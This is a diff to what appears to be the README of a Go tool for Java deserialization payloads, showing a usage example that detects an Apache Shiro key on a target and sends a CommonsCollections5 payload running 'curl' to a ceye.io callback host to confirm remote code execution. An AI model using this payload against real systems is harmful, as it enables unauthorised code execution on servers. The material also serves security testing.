@@ -48,11 +48,11 @@ func main()  {
 }
 ```
 
-Shiro550 Scan Code
+Example: Shiro Scan Code
 
 ```go
-......
 func TestFindShiro(t *testing.T) {
+	......
 	target := "http://192.168.222.132:8080/"
 	key := shiro.CheckShiroKey(target)
 	if key != "" {
@@ -60,8 +60,11 @@ func TestFindShiro(t *testing.T) {
 	}
 	payload := gososerial.GetCC5("curl xxxxx.ceye.io")
 	shiro.SendPayload(key, payload, target)
+	if ceye.CheckResult("your_ceye_token") {
+		log.Info("find shiro!")
+	}
+	......
 }
-......
 ```
 
 ## About
